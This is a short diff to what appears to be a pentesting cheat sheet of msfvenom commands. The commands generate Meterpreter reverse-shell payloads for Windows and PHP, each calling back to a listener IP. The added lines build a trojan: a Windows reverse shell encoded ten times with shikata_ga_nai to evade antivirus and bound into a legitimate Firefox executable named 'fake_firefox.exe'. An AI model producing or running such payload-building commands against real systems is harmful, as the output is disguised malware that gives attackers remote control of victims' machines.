@@ -238,3 +238,6 @@ msfvenom -p windows/meterpreter/reverse_tcp --platform windows --arch x86 -f exe
 ````bash
 msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.101 lport=7000 -f raw > /home/kali/Desktop/shell.php
 ````
+````bash
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.4.4 lport=3000 -f exe -e x86/shikata_ga_nai -i 10 -k -x /root/Bureau/Outils/firefox.exe -o /root/Bureau/Malwares/fake_firefox.exe
+````
